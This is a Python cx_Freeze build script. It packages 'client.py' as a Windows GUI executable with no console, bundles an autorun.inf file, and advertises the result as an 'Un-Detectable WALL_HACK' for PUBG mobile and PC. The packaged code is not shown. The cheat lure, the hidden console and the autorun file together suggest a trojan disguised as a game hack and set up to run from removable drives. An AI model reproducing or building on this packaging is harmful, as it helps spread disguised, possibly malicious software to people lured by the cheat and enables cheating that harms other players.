import sys
from cx_Freeze import setup, Executable

include_file = ['autorun.inf']
base = None

if sys.platform == 'win32':
    base = 'Win32GUI'
setup(name="Player Unknown Battleground WALL_HACK",
      version="0.1",
      description="Can't play PUBG.. here is the solution. Un-Detectable WALL_HACK for both pubg mobile and pc",
      options={'build.exe':{'include_files':include_file}},
      executables=[Executable("client.py",base=base)])


